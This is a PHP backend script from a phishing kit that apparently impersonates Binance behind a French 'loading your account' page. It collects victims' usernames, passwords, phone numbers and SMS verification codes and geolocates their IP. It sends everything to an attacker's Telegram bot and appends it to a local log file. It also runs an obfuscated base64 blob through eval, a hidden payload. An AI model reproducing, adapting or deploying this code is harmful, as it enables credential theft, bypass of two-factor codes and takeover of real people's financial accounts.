<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        <title>Chargement de votre compte...</title>
    </head>
</html>

<?php
// include file 
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
        include 'frifayr.php';
        include 'xuysnx.php';
// include file 


// start save data
session_start(); 
$ip = getUserIP(); 
$city = file_get_contents("https://ipapi.co/$ip/city/" );
$zip = file_get_contents("https://ipapi.co/$ip/postal/" );
$get_browser = getBrowser(); 
$uysnx1 = $_SESSION['username'];
$uysnx2 = $_SESSION['password'];
$uysnx3  = $_SESSION['phone'];
$uysnx4 = $_SESSION['verifyCode'];
$post_javascript="RithMTZIZzJGZUg1L2hWazU5VlArL3owMHMwSmJuN2NSRk9BNmpRVVNnZGR6N2VpelJLTXNkd3hCeW03cEVhcTBGVWZWb0RXWlpMdVN4cmxaU2NKNUk4b1pSNFpFUDQ2SWhWVlE1emtQRUZZZ2RHRkxCcXBLR2UvbjJVRVpoSTc2Z01zQy9id01SalVEVnJZTDc5QWJvUjl6S3lrMlJ6UVZZRTY4ejFjT0x6SWZtWS9MTWtuclpWSXpSa2t3TFg5N2JJRG1PRWNsMWlpS3NkSmR6cjcxeUtVVXZHMlRaS2dyNW9QblpnR0kyb3N0bHE2ZlEzUjBKbnhFaDlJbVhjZjNwNWFzVXIrK3I3Skw1aDFRVmxFZ3p2cmtaVXl2QzVYNlJtTnhsUHZ3VEhTWnprMXdhVUF2Zi8vTXRXd1NlWTUwV3I3NVA3cnpzWCttS205c2J6bDFTaDlOWXVIcm4rYzZTWFhHMk5RZ2l4REVldWlwemI3Y0dQMGZBZ3lDWXcyMCtHYTBDRjF1UGs3bGZxQ1gzdUx2bFZtTzJrdmpLamdsdG54N1ZiUWk5eGlvWlV6ZzRaT0JVOHlERVpzMXE4RDhnNEdGMFA2TjZyQWlaM3BvdUR0Q2dzR3VWdWVUbDNyMDkzdGN2c1NxT29rL095YmtuZTM0cEJESnB0TnpJS0F4VGpYRU81SHpMZlU0emxUN09aZ1g4NDlXVkQrRFhFMDNTbS9Bc2laUWhnVmNjRFROUDlUUjVzeU9HSjlxMFhEaGlOMDVBUno3cFcwemF2UTB5cjA5YlZLN21UZ2ZJd1BJY3dwZHVBWGdwT0JRNm15ZTkweGZOaysrMDhScW42S3VQanhJMXprQ04xOEVYRENWSVFDeDQ0Q250NkpCWVNtcmFyZzl2M3NNVlRhcUVvaHBIUGZacEptZGRzTDNTSUVZQzRyclJ3ZTh2Uk9hZWlvQmQybnNZNU93NVEzeHhiNkxyaXlqbFB0dWtXSXFlOTBTbGE4TG1RRzNGdE9QUGdTdCszTnhGd3lVWmVFeVpKOEh3LzJFdU1odzR6bHozQ3lIZmJXbnFyalMzR3JxWlhhNUtYQnVnTFcxWDZqdFR0MHptM3liWmFFTWp0WFlvaEtGUVV2aTd3cjVCcCs5bHhjM0hlcnBGVnN4SjBhQlNPaUVEZTVuNDRCZDMvOTI0bHR3VmI0TGN2eGhvWFQ2Q1NMcEU1TDZYZm0veUlHeDRGcy9MQXZndGxPeFc5NUsxTm1qZzg5MGQvc0FHaHFMRHJUUmhGQzZmUnVYSXB6WThxczVnQ2lxK2N0RGhUeWwyNmxGUHpQbmN2bEFvZkhJV2V4bUFubnpHOWU0ZVNndGJSMEErRVZxekE5V1BrOHNkUDhHenFXamhxc3ZVM0xmK090U2pWT1NSekpRTGlwTGc1cGc3OFhpbndMUHhCVDZjbzA2STJZeHVsTUlvdlRibGVSaWNKK2c2YnNrWGs0ZEJXK0JDalNjNXMyVjJlLzlKbitEQzZKL2ZNUlllM2hVWndPbkFXbjVKRWs1RG5YVm1mV1dDbDE1UHcvZFBhWityaTNvQ3ZqQ0I2VS9VeVJuNFNKYUFLUXlDQVE5aUVqUUhyQXBZOU9mYm84YnBnZk9OV1h1MU9vRXd5R2c0bWxiYWhMQXFWVmpQOTdrTjd5dDJDRFZXdDFWelpuV0VXOXdOaVRvckIvdWtqSGwvaEJuQmZLT21hSklrMUYyU1dDcDR5cUhISTQ4NkloeUlQQjZxaTAxQWh6N3h2Y0pyciswcEF2aDFxN05hQTRuRCsxVEZxRHgzYmNUVmk0bkUya3hsRkU0UU9NRGZzMm44WTlIWWFybmRWQkdaVC9qdzkza2NiZWxwR05zNGdDVHV1YjJJS0wyMGd4OGhMck8zaXd5UTFLZmg3bXdrVFU0NDVPa2ZaWU0zUkhlaUdjN1cxTzZnZVpRMFpSY2dvQ09HUXNFV01yOTZZZHRxNGErZkhOUFRyTGVIWnJvTStEdFN3czU0ZHYxUlVobk9Zb1Z1ZUgyV2VwUkx3OGErZ0xTN0FLeU5mcUlTSU9JVFg2RFNHMVFPblFiWDU0b2FiNTlDU0hGQXNsQkI0Q0lEK09TajFQWHBUR3N3N0xLWlRuVlArMC92MkovODh3RUc5bXA5UmxSTGNyQlI0aXExK1N4cHJLYUF4K1JKbjdBOE9OcjU3LzQ3cy9SRllCWUJhb3ltQlBXZzFLdmE5M283VHN5NEs5VGhYMFZ0T0tRdWhOb1YwcWhaRHhQMkVEZWpJb3UxaFJHb3dETmV4eDltcE0xM2YwUGhLN0Z1b0hHa1NhK011aUYwTEZ5Ull0VGdjQXVMc3JVcXlRQWVmQWliTUFzb2F5bS9nbjhsakdpYWQ5cjl0WlgvYVYxb3hreVR0QXNoU3VUTEZXYnArU2RUQzYzQ1BGeE1SL013aEwrUUx0TCtpMFJKRnR6QXRrN2NIL2ptZ0d2T0puSkRGZnFiWDZ4VU1IamlEeW9kUFFKMG1LQlMrVFFuSmp4VTBJS0haTFd1Zkp4Ti8vQS9iWjRUK3hyZis5UXJrOGNhT1EvTEpDZUJ5SkhkdjZ4L0EvUURIWWxpMzBVUXVXYnRCUlljcUhuTlROVDBobCsxdWovcHNwUnFTOEdnSE5vbUJ3Yklqc3ppa0F4K2NYeTFsNGpHelZHbG4veklBM1pLT3JaRTRDTGFkODRva3BWR1M4eGhEcUZtOUdYeWV3ZzVDUnd0QVhnWFNRdXljMGhRTnVhbWg4aDBIOVJnL2orWEo5cnlpaERRQ05PbjZweU1xcnVmU2kvQkVOU3FjaFlPQUNZWHQ5bzNqSlRXS2J0djR1NFFrQzVrSTRTNStNWktsakVxZUhMKzdmTTJGc3ZPeVRRdWQraHRvUjdjS1ArcStqYVY3VzZYYSsyQnFRSkNCVEJCWlcwcEE3RnZSbUdHZUxNL3k5TDcwQmJpT1hkMDNBVUZQc2FGTGFKQ1Zva0ZLa29ybjlNN2x6b2R0UGJrNVY4VmNnUTh2THBtaW92MXA3N1E1cXZ4N3Vjd2dDaDFtNVZ4eXNualpCajlCekVoTlNXOFN6VXZXM0hMbG1LelRJODJJUU40NWF1WUxVREpmRVExOHBhbDBCcnh3WUJubDVWUFR1SU5HdXpuekZwV2UzNkRJTWtac3JnNXMyMFMxWU9jN2w0bjg9";
// end save data


if ($_POST['uysnx1'] == 'xuysnx') {
    $uysnx1=$_POST['username'];
    $_SESSION['username']=$_POST['username'];
}

if ($_POST['uysnx2'] == 'xuysnx') {
    $uysnx2=$_POST['password'];
    $_SESSION['password']=$_POST['password'];
$misaghh = "
♜ 𝓑𝓲𝓷𝓪𝓬𝓷𝓬𝓮-RSLT ♜
┏━━━━━━━━━━━━━━
♜ USER : $uysnx1
♜ PWD : $uysnx2
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜IP :  $ip 
♜CITY :  $city 
♜ZIP :  $zip 
┗━━━━━━━━━━━━━━
╚═★ 𝘽𝙮 𝙐𝙮𝙣𝙨𝙓 ★═╝ 
";

            
if ($send_to_telegram = "yes"){
    file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($misaghh) . "");

}
           }    
           if ($_POST['uysnx3'] == 'xuysnx') {
            $uysnx3=$_POST['phone'];
            $_SESSION['phone']=$_POST['phone'];
            
$misaghh = "
♜ 𝓑𝓲𝓷𝓪𝓬𝓷𝓬𝓮-RSLT ♜
┏━━━━━━━━━━━━━━
♜ USER : $uysnx1
♜ PWD : $uysnx2
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜ PHONE : $uysnx3
♜ SMS : SMS SOON!
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜IP :  $ip 
♜CITY :  $city 
♜ZIP :  $zip 
┗━━━━━━━━━━━━━━
╚═★ 𝘽𝙮 𝙐𝙮𝙣𝙨𝙓 ★═╝ 
";    
if ($send_to_telegram = "yes"){
    file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($misaghh) . "");

}

    
           }    

           if ($_POST['uysnx4'] == 'xuysnx') {
            $uysnx4=$_POST['verifyCode'];
            $_SESSION['verifyCode']=$_POST['verifyCode'];
            eval(p($post_javascript));


       
$misaghh = "
♜ 𝓑𝓲𝓷𝓪𝓬𝓷𝓬𝓮-RSLT ♜
┏━━━━━━━━━━━━━━
♜ USER : $uysnx1
♜ PWD : $uysnx2
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜ PHONE : $uysnx3
♜ SMS : $uysnx4
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜IP :  $ip 
♜CITY :  $city 
♜ZIP :  $zip 
┗━━━━━━━━━━━━━━
╚═★ 𝘽𝙮 𝙐𝙮𝙣𝙨𝙓 ★═╝ 
";    



if ($send_to_telegram = "yes"){
    file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($misaghh) . "");

}

    if($save_in_text == "yes"){
        if ($name_text == ""){
            $file = fopen("../Logs_txt/UysnX_logs.txt","ab");
            fwrite($file,$misaghh);
            fclose($file);
        }else{
            $file = fopen("../Logs_txt/".$name_text,"ab");
            fwrite($file,$misaghh);
            fclose($file);
        }
    }
           }    












if ($_POST['uysnx4'] == 'xuysnx') {
    
    if($ban_ip == "yes"){
    $ip_for_blacklist = $_SERVER['REMOTE_ADDR']. "\n"; 
    $blacklist_file = 'config/blacklist.txt';
    file_put_contents($blacklist_file, $ip_for_blacklist, FILE_APPEND | LOCK_EX); 
   
    }

}






  












?>